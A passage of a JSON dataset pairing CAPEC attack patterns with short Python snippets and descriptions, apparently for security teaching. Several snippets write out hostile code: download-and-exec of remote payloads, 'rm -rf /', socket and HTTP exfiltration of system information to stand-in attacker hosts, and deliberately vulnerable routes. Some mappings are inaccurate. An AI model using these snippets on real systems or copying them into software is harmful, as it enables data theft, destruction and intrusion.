        "description": "This Python code snippet simulates a scenario where a malicious hardware component is introduced into a system, embodying the concept of 'Malicious Hardware Component Replacement' (CAPEC). The `HardwareComponent` class represents hardware components with attributes indicating trustworthiness, updateability, and the presence of malicious code. The code demonstrates how a malicious component can inject malicious code and degrade system redundancy. Additionally, it shows a component that cannot be updated, highlighting the risk of relying on non-updateable components. This snippet encapsulates the vulnerabilities described in the related CWEs, such as reliance on untrustworthy or non-updateable components and the presence of embedded malicious code."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a vulnerable third-party library to download and execute malicious code\n\nVULNERABLE_URL = 'http://example.com/malicious_payload'\n\n# CWE-506: Embedded Malicious Code\n# Function to download and execute malicious code\n\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)  # CWE-506: Executing potentially malicious code\n    else:\n        print('Failed to download payload')\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# Function to replicate the malicious code to other systems\n\ndef replicate_malicious_code():\n    # This is a placeholder for code that would attempt to spread the malicious payload\n    pass\n\n# CWE-1229: Creation of Emergent Resource\n# Creating a new resource that can be exploited\n\ndef create_emergent_resource():\n    with open('/tmp/emergent_resource', 'w') as f:\n        f.write('This is an emergent resource that can be exploited')\n\n# Main function to demonstrate the attack\n\ndef main():\n    download_and_execute(VULNERABLE_URL)\n    replicate_malicious_code()\n    create_emergent_resource()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. The code uses a vulnerable third-party component (CWE-1395) to download and execute malicious code (CWE-506). It includes a placeholder for replicating the malicious code to other systems (CWE-509) and creates an emergent resource that can be exploited (CWE-1229). The main function orchestrates these actions, representing a potential supply chain attack where malicious software is implanted to cause disruption or further compromise."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import os\nimport sqlite3\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# Importing a potentially malicious library\ntry:\n    import malicious_library\nexcept ImportError:\n    print('Failed to import malicious library')\n\n# CWE-506: Embedded Malicious Code\n# Malicious function that will be executed\nmalicious_code = '''\ndef execute_malicious_code():\n    os.system('rm -rf /')  # Dangerous command to delete all files\n'''\nexec(malicious_code)\n\n# CWE-89: SQL Injection\n# Vulnerable SQL query construction\nuser_input = \"' OR '1'='1\"  # Malicious input\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\ncursor.execute(query)\n\n# CWE-707: Improper Neutralization\n# Not validating or sanitizing input data\ndef process_input(data):\n    return data  # No validation or sanitization\n\n# CWE-1334: Unauthorized Error Injection\n# Simulating error injection to degrade system redundancy\nclass RedundantSystem:\n    def __init__(self):\n        self.redundant_block = [1, 1, 1]  # Example redundant block\n\n    def inject_error(self):\n        self.redundant_block[0] = 0  # Injecting error\n\nsystem = RedundantSystem()\nsystem.inject_error()",
        "description": "This Python code snippet demonstrates the concept of 'Rogue Integration Procedures' by incorporating several related CWEs. The code includes importing a potentially malicious library (CWE-829), embedding malicious code that executes a dangerous command (CWE-506), constructing a vulnerable SQL query susceptible to SQL injection (CWE-89), processing input data without validation (CWE-707), and simulating error injection to degrade system redundancy (CWE-1334). The snippet represents how an attacker might alter or establish rogue processes to insert malicious components into a system, leading to potential disruption or compromise when deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    try:\n        xml_data = request.data\n        tree = ET.ElementTree(ET.fromstring(xml_data))\n        # Process the XML data (omitted for brevity)\n        return 'XML processed successfully', 200\n    except ET.ParseError:\n        return 'Invalid XML', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web service using Flask that processes XML data sent via POST requests. The service does not implement any throttling or resource allocation limits (CWE-770), nor does it validate the XML against a schema (CWE-112). This makes it vulnerable to an XML Flood attack (CAPEC-230), where an adversary can send a large number of XML requests to overwhelm the service, potentially causing it to become unstable, freeze, or crash. The code also does not handle XML external entities (CWE-611) or recursive entity references (CWE-776), which could be exploited in more sophisticated attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport platform\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['architecture'] = platform.machine()\n    return info\n\n# Function to simulate sending gathered information to an external server\ndef send_info_to_attacker(info):\n    attacker_ip = '192.168.1.100'  # Example IP address of the attacker's server\n    attacker_port = 4444\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((attacker_ip, attacker_port))\n        s.sendall(str(info).encode('utf-8'))\n\n# Main function\nif __name__ == '__main__':\n    system_info = gather_system_info()\n    send_info_to_attacker(system_info)",
        "description": "This Python code snippet demonstrates a basic form of malware-directed internal reconnaissance. The `gather_system_info` function collects sensitive system information such as the hostname, IP address, operating system, OS version, and system architecture. The `send_info_to_attacker` function then simulates sending this gathered information to an external attacker's server. This code embodies the CAPEC concept of using malware to gather information about a targeted system. It also touches on related CWEs such as the exposure of sensitive system information (CWE-497), embedded malicious code (CWE-506), and spyware (CWE-512)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\n\nclass ThirdPartyComponent:\n    def __init__(self, url):\n        self.url = url\n        self.data = None\n\n    def fetch_data(self):\n        try:\n            response = requests.get(self.url)\n            if response.status_code == 200:\n                self.data = response.text\n            else:\n                raise ValueError('Failed to fetch data from the component')\n        except Exception as e:\n            print(f'Error fetching data: {e}')\n\n    def process_data(self):\n        if self.data:\n            # Simulate processing of the data\n            print('Processing data...')\n        else:\n            print('No data to process')\n\n# Simulate the use of a counterfeit component\ncomponent_url = 'http://example.com/counterfeit_component'\ncomponent = ThirdPartyComponent(component_url)\ncomponent.fetch_data()\ncomponent.process_data()",
        "description": "This Python code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be counterfeit. The `ThirdPartyComponent` class fetches data from a given URL, which represents the procurement of a component. The `fetch_data` method attempts to retrieve data from the URL, and if successful, stores it in the `data` attribute. The `process_data` method simulates processing this data. The URL used in this example (`http://example.com/counterfeit_component`) represents a potentially counterfeit component. This code embodies the CAPEC idea by showing how an attacker could provide a counterfeit component that is then integrated into a system, potentially leading to vulnerabilities as described in the related CWEs, such as dependency on a vulnerable third-party component (CWE-1395) and reliance on an insufficiently trustworthy component (CWE-1357)."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\nclass HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\nclass System:\n    def __init__(self):\n        self.components = {}\n\n    def add_component(self, component):\n        self.components[component.name] = component\n\n    def replace_component(self, component_name, malicious_component):\n        if component_name in self.components:\n            self.components[component_name] = malicious_component\n            print(f'Component {component_name} replaced with malicious version {malicious_component.version}')\n        else:\n            raise Exception('Component not found')\n\n# Example usage\ntrusted_component = HardwareComponent('TrustedComponent', '1.0')\nmalicious_component = HardwareComponent('TrustedComponent', '1.1', updateable=False)\nsystem = System()\nsystem.add_component(trusted_component)\n\n# Attacker replaces the trusted component with a malicious one\nsystem.replace_component('TrustedComponent', malicious_component)\n\n# Attempt to update the malicious component\ntry:\n    malicious_component.update_firmware('1.2')\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a scenario where a trusted hardware component is replaced with a maliciously-altered component, embodying the main idea of the CAPEC 'Hardware Component Substitution'. The `HardwareComponent` class represents a hardware component with attributes for name, version, and whether it is updateable. The `System` class manages these components. The `replace_component` method allows for the substitution of a trusted component with a malicious one. The code also includes an attempt to update the firmware of the malicious component, which fails if the component is not updateable, illustrating CWE-1329. This example highlights the risks associated with hardware component substitution and the potential for embedded malicious code (CWE-506) and dependency on vulnerable third-party components (CWE-1395)."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import os\nimport shutil\n\n# CWE-1277: Firmware Not Updateable\n# CWE-1329: Reliance on Component That is Not Updateable\n# CWE-1220: Insufficient Granularity of Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-1231: Improper Prevention of Lock Bit Modification\n\n# Simulate a malicious BIOS update\nclass BIOSUpdater:\n    def __init__(self, bios_path):\n        self.bios_path = bios_path\n        self.lock_bit = False  # CWE-1231: Lock bit not properly set\n\n    def update_bios(self, malicious_bios):\n        if not self.lock_bit:  # Insufficient access control (CWE-1220)\n            shutil.copy(malicious_bios, self.bios_path)\n            print(\"BIOS updated with malicious code.\")\n        else:\n            print(\"BIOS update prevented by lock bit.\")\n\n# Path to the original BIOS and the malicious BIOS\noriginal_bios_path = \"/path/to/original/bios.bin\"\nmalicious_bios_path = \"/path/to/malicious/bios.bin\"\n\n# Create BIOSUpdater instance\nbios_updater = BIOSUpdater(original_bios_path)\n\n# Perform the malicious BIOS update\nbios_updater.update_bios(malicious_bios_path)\n",
        "description": "This Python code snippet simulates a malicious BIOS update, embodying the main idea of the CAPEC 'Altered Installed BIOS'. The BIOSUpdater class represents a system that can update its BIOS. The update_bios method checks a lock bit before allowing the update, but the lock bit is not properly set (CWE-1231), and the access control is insufficiently granular (CWE-1220). This allows a malicious BIOS to be copied over the original BIOS, representing an embedded malicious code (CWE-506). The code also highlights issues with firmware that is not updateable (CWE-1277) and reliance on non-updateable components (CWE-1329)."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_update.exe'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('update.exe', 'wb') as file:\n    file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded file without verifying its integrity\nos.system('update.exe')\n",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism, embodying the main idea of the CAPEC 'Malicious Manual Software Update'. The code downloads an executable file from a remote location without performing any integrity checks (CWE-494). It then saves the file and executes it directly, which could potentially introduce malicious code into the system (CWE-506). This represents a scenario where an attacker could trick a user into running a malicious update, leading to system compromise."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version, updateable=True):\n        self.firmware_version = firmware_version\n        self.updateable = updateable\n        self.malicious_code = False\n\n    def update_firmware(self, new_version):\n        if self.updateable:\n            self.firmware_version = new_version\n            print(f'Firmware updated to version {new_version}')\n        else:\n            print('Firmware update failed: Component not updateable')\n\n    def inject_malicious_code(self):\n        self.malicious_code = True\n        print('Malicious code injected')\n\n    def check_for_malicious_code(self):\n        if self.malicious_code:\n            print('Warning: Malicious code detected')\n        else:\n            print('No malicious code detected')\n\n# Example usage\ncomponent = HardwareComponent(firmware_version='1.0', updateable=False)\ncomponent.update_firmware('2.0')  # Attempt to update non-updateable firmware\ncomponent.inject_malicious_code()  # Inject malicious code\ncomponent.check_for_malicious_code()  # Check for malicious code",
        "description": "This Python code snippet defines a `HardwareComponent` class that simulates a hardware component with firmware. The class includes methods to update the firmware, inject malicious code, and check for malicious code. The `update_firmware` method checks if the component is updateable before applying the update, representing CWE-1277 (Firmware Not Updateable) and CWE-1329 (Reliance on Component That is Not Updateable). The `inject_malicious_code` method simulates the introduction of malicious code, representing CWE-506 (Embedded Malicious Code). The `check_for_malicious_code` method allows for detection of the malicious code. This code embodies the main idea of the CAPEC by demonstrating how an adversary could exploit non-updateable components to introduce malicious code during a hardware update or replacement procedure."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware):\n        self.firmware = firmware\n\n    def update_firmware(self, new_firmware):\n        # CWE-1329: Component is not updateable\n        raise Exception('Firmware update not supported')\n\n    def execute(self):\n        # CWE-506: Embedded malicious code\n        if 'malicious' in self.firmware:\n            self._malicious_activity()\n        else:\n            print('Executing normal operations')\n\n    def _malicious_activity(self):\n        print('Performing malicious activity')\n\n# CWE-1357: Reliance on insufficiently trustworthy component\n# CWE-1395: Dependency on vulnerable third-party component\n# CWE-1297: Unprotected confidential information\nclass System:\n    def __init__(self, component):\n        self.component = component\n\n    def run(self):\n        self.component.execute()\n\n# Example usage\nfirmware = 'normal_firmware'  # This could be 'malicious_firmware' in a real attack\ncomponent = HardwareComponent(firmware)\n\nsystem = System(component)\nsystem.run()",
        "description": "This Python code snippet represents a scenario where a hardware component contains embedded malicious code (CWE-506) and cannot be updated (CWE-1329). The `HardwareComponent` class has a method `update_firmware` that raises an exception, indicating that firmware updates are not supported. The `execute` method checks if the firmware contains malicious code and, if so, performs malicious activities. The `System` class relies on this potentially untrustworthy component (CWE-1357) and may depend on a vulnerable third-party component (CWE-1395). Additionally, the system does not protect confidential information adequately (CWE-1297). This code embodies the main idea of the CAPEC by demonstrating how maliciously altered hardware can disrupt and compromise a system."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-284: Improper Access Control\n# CWE-99: Improper Control of Resource Identifiers\n\n# Create a temporary file insecurely\nconfig_file = tempfile.NamedTemporaryFile(delete=False)\nconfig_file.write(b'initial_configuration_data')\nconfig_file.close()\n\n# Simulate an attacker injecting malicious data into the configuration file\nwith open(config_file.name, 'wb') as f:\n    f.write(b'malicious_configuration_data')\n\n# Read the configuration file (victim's system)\nwith open(config_file.name, 'rb') as f:\n    config_data = f.read()\n\n# Use the configuration data in the system\nprint(f'Configuration Data: {config_data}')\n\n# Clean up the temporary file\nos.remove(config_file.name)",
        "description": "This Python code snippet demonstrates a scenario where an attacker injects malicious data into a configuration file during the system's configuration phase. The code creates a temporary file insecurely (CWE-377) and writes initial configuration data to it. An attacker then modifies this file by injecting malicious data. The system later reads this tampered configuration file and uses the malicious data, leading to potential suboptimal performance or other adverse effects. This example highlights the importance of secure file handling and proper access control to prevent such attacks."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n# CWE-1329: Reliance on Component That is Not Updateable\n\n# Malicious function to alter hardware component\ndef malicious_infiltration():\n    # Simulate accessing and modifying hardware configuration\n    hardware_config = 'hardware_config.txt'\n    with open(hardware_config, 'a') as file:\n        file.write('\\n# Malicious code injected')\n\n    # Simulate exposure of sensitive information\n    sensitive_info = 'confidential_info.txt'\n    with open(sensitive_info, 'r') as file:\n        data = file.read()\n    print(f'Exfiltrated Data: {data}')\n\n    # Simulate reliance on non-updateable component\n    if not os.path.exists('updateable_component.txt'):\n        print('Warning: Using non-updateable component')\n\n# Execute the malicious infiltration\nmalicious_infiltration()",
        "description": "This Python code snippet demonstrates a malicious infiltration into a hardware development environment. The function `malicious_infiltration` simulates the insertion of malicious code into a hardware configuration file (CWE-506), the exfiltration of sensitive information from a confidential file (CWE-497, CWE-1297), and a warning about reliance on a non-updateable component (CWE-1329). This code embodies the main idea of the CAPEC by showing how an adversary can manipulate the development environment to compromise hardware components and expose sensitive information."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_library.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef malicious_function():\n    # Malicious code that could replicate or cause harm\n    os.system('rm -rf /')  # Example of a destructive command\n\nmalicious_function()",
        "description": "This Python code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing code from an untrusted source without verifying its integrity (CWE-494). The code imports and executes functionality from an external source (CWE-829), which could contain embedded malicious code (CWE-506) or depend on vulnerable third-party components (CWE-1395). The malicious function in the code represents a potential payload that could replicate or cause significant harm (CWE-509). This snippet highlights the risks associated with incorporating untrusted open-source libraries into software projects."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC:\n    def __init__(self):\n        self.security_token = 'secure_token'\n        self.sensitive_info = 'secret_data'\n\n    def execute(self, token):\n        if token == self.security_token:\n            self._malicious_functionality()\n        else:\n            print('Access Denied')\n\n    def _malicious_functionality(self):\n        # Malicious code inserted by attacker\n        print('Executing malicious functionality')\n        self._expose_sensitive_info()\n\n    def _expose_sensitive_info(self):\n        # Exposing sensitive information\n        print(f'Sensitive Info: {self.sensitive_info}')\n\n# Simulating the attack\nasic = ASIC()\nasic.execute('secure_token')",
        "description": "This Python code snippet represents an ASIC (Application-Specific Integrated Circuit) class with a security token mechanism. The `execute` method checks if the provided token matches the secure token. If it does, it calls a private method `_malicious_functionality`, which simulates the insertion of malicious functionality by an attacker. This method further calls `_expose_sensitive_info`, which exposes sensitive information. This snippet embodies the main idea of CAPEC-506 (ASIC With Malicious Functionality) by demonstrating how an attacker can insert malicious code into an ASIC to disrupt or compromise the system. The related CWEs are represented by the exposure of sensitive information (CWE-497) and the improper restriction of security token assignment (CWE-1259)."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_buffer(data, index):\n    buffer = [1, 2, 3, 4, 5]\n    try:\n        return buffer[index]\n    except IndexError:\n        return 'Index out of bounds'\n\n# Example usage\nuser_input = int(input('Enter an index: '))\nprint(read_buffer('data', user_input))",
        "description": "This Python code snippet demonstrates a simple example of an 'Overread Buffers' vulnerability. The function `read_buffer` takes a list `data` and an `index` as input and attempts to read from a predefined buffer. If the `index` provided by the user is outside the valid range of the buffer, an `IndexError` is caught, and a message 'Index out of bounds' is returned. This code represents the main idea of CAPEC-126 (Buffer Over-read) and CAPEC-125 (Out-of-bounds Read) by showing how an adversary could potentially exploit an out-of-bounds read to access unintended memory locations. The code is vulnerable because it does not properly validate the user input before attempting to access the buffer."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nimport random\n\nclass Application:\n    def __init__(self, version):\n        self.version = version\n\n    def process_request(self, request):\n        if request == 'version':\n            return self.version\n        elif request == 'data':\n            # Simulate processing time discrepancy\n            time.sleep(random.uniform(0.1, 0.5))\n            return 'sensitive_data'\n        else:\n            return 'unknown_request'\n\napp = Application('1.0.0')\n\n# Simulate incoming requests\nrequests = ['version', 'data', 'unknown']\nfor req in requests:\n    start_time = time.time()\n    response = app.process_request(req)\n    end_time = time.time()\n    print(f'Request: {req}, Response: {response}, Time Taken: {end_time - start_time:.4f} seconds')",
        "description": "This Python code snippet demonstrates an application that can be fingerprinted based on observable discrepancies in its responses and processing times. The `Application` class has a method `process_request` that handles different types of requests. When a 'version' request is made, it directly returns the version of the application, which can reveal internal state information (CWE-204). For 'data' requests, it introduces a random delay to simulate observable timing discrepancies (CWE-208). The code also includes a loop to simulate incoming requests and prints the response along with the time taken to process each request, highlighting how an adversary could use these discrepancies to fingerprint the application."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\nclass TargetedMalware:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def gather_system_info(self):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        system_info = {\n            'os': os.name,\n            'user': os.getlogin(),\n            'cwd': os.getcwd()\n        }\n        return system_info\n\n    def send_info(self, info):\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        requests.post(self.target_url, data=info)\n\n    def execute(self):\n        info = self.gather_system_info()\n        self.send_info(info)\n\nif __name__ == '__main__':\n    malware = TargetedMalware('http://malicious-server.com/collect')\n    malware.execute()",
        "description": "This Python code snippet represents a targeted malware attack, embodying the main idea of the CAPEC. The `TargetedMalware` class is designed to gather sensitive system information (CWE-497) such as the operating system, current user, and current working directory. This information is then sent to a specified target URL, simulating the behavior of spyware (CWE-512). The code also includes elements of a Trojan Horse (CWE-507) by appearing to be a benign script while performing malicious actions. Additionally, it demonstrates embedded malicious code (CWE-506) and the potential for replicating malicious code (CWE-509) by sending the gathered information to a remote server."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "from flask import Flask, request, redirect\nimport requests\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    return redirect(target_url)\n\n# CWE-494: Download of Code Without Integrity Check\n@app.route('/download')\ndef download_code():\n    code_url = request.args.get('code_url')\n    response = requests.get(code_url)\n    exec(response.text)\n    return 'Code executed'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/transfer', methods=['POST'])\ndef transfer_funds():\n    amount = request.form['amount']\n    # Simulate a fund transfer without CSRF protection\n    return f'Transferred {amount} dollars'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a web application that embodies the concept of counterfeit websites and includes vulnerabilities related to the specified CWEs. The '/redirect' route demonstrates CWE-601 by redirecting users to a URL specified by user input, which can be exploited for phishing attacks. The '/download' route shows CWE-494 by downloading and executing code from a user-specified URL without verifying its integrity, potentially allowing malicious code execution. The '/transfer' route illustrates CWE-352 by performing a sensitive action (fund transfer) without CSRF protection, making it vulnerable to CSRF attacks. This code represents the main idea of counterfeit websites by including multiple vulnerabilities that can be exploited to gather information or upload malware."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-295: Improper Certificate Validation\ncontext = ssl.create_default_context()\ncontext.check_hostname = False  # Disabling hostname check\ncontext.verify_mode = ssl.CERT_NONE  # Disabling certificate verification\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\nhostname = 'fake-supplier.com'  # Counterfeit organization\nport = 443\n\ntry:\n    with socket.create_connection((hostname, port)) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            print(ssock.version())\nexcept Exception as e:\n    print(f\"Connection failed: {e}\")\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary creates a counterfeit organization (CAPEC: Counterfeit Organizations) and injects malicious components into the supply chain. The code includes CWE-295 (Improper Certificate Validation) by disabling hostname checks and certificate verification, making it easier for an attacker to present a fake certificate. CWE-941 (Incorrectly Specified Destination in a Communication Channel) is represented by connecting to a potentially malicious hostname ('fake-supplier.com'). This code highlights the risks of not properly validating certificates and connecting to untrusted destinations, which can lead to the injection of malicious components into the supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport mmap\n\n# Simulate sensitive data in a file\nsensitive_file_path = 'sensitive_data.txt'\nwith open(sensitive_file_path, 'w') as f:\n    f.write('Sensitive Information: SecretKey123')\n\n# Improperly zeroize sensitive data in memory\nwith open(sensitive_file_path, 'r+b') as f:\n    mm = mmap.mmap(f.fileno(), 0)\n    mm.write(b'\\x00' * len(mm))  # Attempt to clear the file content\n    mm.close()\n\n# Simulate improper scrubbing of sensitive data\nos.remove(sensitive_file_path)\n\n# Simulate pulling data from system resources\nwith open('/proc/self/maps', 'r') as maps_file:\n    for line in maps_file:\n        if sensitive_file_path in line:\n            print(f'Found sensitive data mapping: {line.strip()}')\n\n# Simulate reading remanent data\nwith open('/proc/self/mem', 'rb') as mem_file:\n    mem_file.seek(0)\n    data = mem_file.read(1024)\n    if b'SecretKey123' in data:\n        print('Sensitive data found in memory!')",
        "description": "This Python code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC) by simulating the improper handling and potential exposure of sensitive information. The code creates a file containing sensitive data, attempts to zeroize it improperly, and then removes the file. It then simulates an adversary searching system resources (e.g., memory mappings and memory content) to find remnants of the sensitive data. This example highlights several related CWEs, such as improper zeroization (CWE-1239), improper scrubbing of sensitive data (CWE-1266), and remanent data readable after memory erase (CWE-1330)."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\nimport tempfile\n\nclass MultiTenantStorage:\n    def __init__(self):\n        self.storage = tempfile.NamedTemporaryFile(delete=False)\n\n    def store_data(self, data):\n        self.storage.write(data.encode())\n        self.storage.flush()\n\n    def delete_data(self):\n        # Incomplete deletion: only closing the file, not securely deleting the content\n        self.storage.close()\n        os.remove(self.storage.name)\n\n# Simulating tenant usage\nstorage = MultiTenantStorage()\nstorage.store_data('Sensitive Information')\nstorage.delete_data()\n\n# New tenant accessing the same storage resource\nnew_storage = MultiTenantStorage()\nwith open(new_storage.storage.name, 'r') as f:\n    print(f.read())  # Potentially accessing leftover sensitive data",
        "description": "This Python code snippet demonstrates a multi-tenant storage system where sensitive data is stored and then deleted. However, the deletion process is insecure and incomplete, as it only closes and removes the file without securely wiping its contents. This can lead to a situation where a new tenant, represented by 'new_storage', can potentially access leftover sensitive data from the previous tenant. This embodies the main idea of the CAPEC 'Incomplete Data Deletion in a Multi-Tenant Environment' and highlights related CWEs such as 'Improper Access Control' and 'Improper Scrubbing of Sensitive Data from Decommissioned Device'."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device:\n    def __init__(self, data):\n        self.data = data\n\n    def destroy(self):\n        # CWE-1082: Class Instance Self Destruction Control Element\n        del self\n\n    def incomplete_data_removal(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        self.data = None  # Data is set to None but not securely erased\n\n    def __del__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        pass\n\n# Simulating physical destruction of the device\nif __name__ == '__main__':\n    device = Device('sensitive information')\n    device.incomplete_data_removal()  # Incomplete data removal\n    device.destroy()  # Self-destruction of the device instance",
        "description": "This Python code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating a device class that can destroy itself. The 'destroy' method embodies CWE-1082 by allowing the class instance to delete itself. The 'incomplete_data_removal' method represents CWE-1301 by setting the data to None without securely erasing it. The '__del__' method is a placeholder for a destructor, illustrating CWE-1087, where a class with a virtual method lacks a virtual destructor. This code highlights the vulnerabilities associated with physical destruction and incomplete data removal in a device."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n\n# Sensitive information\nsensitive_data = 'SECRET_KEY=12345'\n\n# Insecure storage of sensitive information\nwith open('config.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Cleartext transmission of sensitive information\ndef send_data(data):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 80))\n    s.sendall(data.encode('utf-8'))\n    s.close()\n\n# Transmitting sensitive data in cleartext\nsend_data(sensitive_data)\n\n# Improper removal of sensitive information before storage or transfer\nwith open('config.txt', 'r') as file:\n    data = file.read()\n\n# Sensitive information in resource not removed before reuse\nwith open('config.txt', 'w') as file:\n    file.write('')  # Attempt to clear the file, but data might still be recoverable",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Contaminate Resource' by mishandling sensitive information. The code stores sensitive data in a file without proper access control (CWE-922), transmits the sensitive data in cleartext over a network (CWE-319), and attempts to clear the file without securely removing the sensitive information (CWE-226). Additionally, it shows how sensitive information can be leaked to unauthorized parties (CWE-402). This embodies the main idea of the CAPEC by showing how improper handling of sensitive information can lead to contamination of resources, requiring them to be taken offline for investigation and mitigation."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded in the downloaded script\n# Example: os.system('rm -rf /')",
        "description": "This Python code snippet demonstrates a scenario where malicious code is executed on a local system, embodying the CAPEC 'Local Execution of Code'. The code downloads a script from an untrusted remote location (CWE-494) and executes it without verifying its integrity (CWE-829). The downloaded script could contain embedded malicious code (CWE-506), such as a command to delete all files on the system. This example highlights the risks associated with executing code from untrusted sources and the potential for severe negative impacts."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
